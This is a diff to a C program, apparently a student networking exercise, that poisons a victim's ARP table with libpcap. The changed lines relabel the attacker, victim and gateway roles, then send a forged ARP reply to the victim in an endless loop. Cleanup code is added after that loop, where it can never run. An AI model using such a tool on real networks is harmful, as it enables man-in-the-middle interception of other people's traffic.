@@ -8,7 +8,7 @@
  * Send user defined buffer as packet, using pcap_sendpacket()
  * Find attacker(=you)'s MAC information (@google)
  * 
- * Three entities: attacker, victim, gateway
+ * Three entities: attacker, sender (victim), target (gateway)
  * 
  * 1. Find attacker IP address
  * 2. Find attacker MAC address
@@ -65,7 +65,6 @@ int main(int argc, char *argv[])
 	my_etharp_hdr      *arp_reply          = (my_etharp_hdr *)calloc(1, sizeof(my_etharp_hdr));
 	uint8_t            *arp_reply_packet   = (uint8_t *)calloc(1, sizeof(my_etharp_hdr));
 	
-
 
 	inet_aton(argv[3], target_IP_struct);
 	target_IP_int = target_IP_struct->s_addr;
@@ -174,13 +173,22 @@ int main(int argc, char *argv[])
 	memcpy(arp_reply_packet, arp_reply, sizeof(my_etharp_hdr));
 
 	puts("[+] Success!");
-	puts("[+] Repetitively sending fake ARP reply to sender: sender ARP table will be poisoned...");
+	printf("[+] Repetitively sending fake ARP reply to sender: sender <%s> ARP table will be poisoned!\n", argv[2]);
 	while (1)
 	{
 		pcap_sendpacket(handle, arp_reply_packet, sizeof(my_etharp_hdr));
 		puts(".");
 		sleep(1);
 	}
+
+
+	pcap_close(handle);
+	free(attacker_IP_struct); free(attacker_MAC_array);
+	free(sender_IP_struct);   free(sender_MAC_array);
+	free(target_IP_struct);   free(header);
+	free(arp_request);        free(arp_request_packet);
+	free(arp_reply);          free(arp_reply_packet);
+
 
 	return 0;
 }
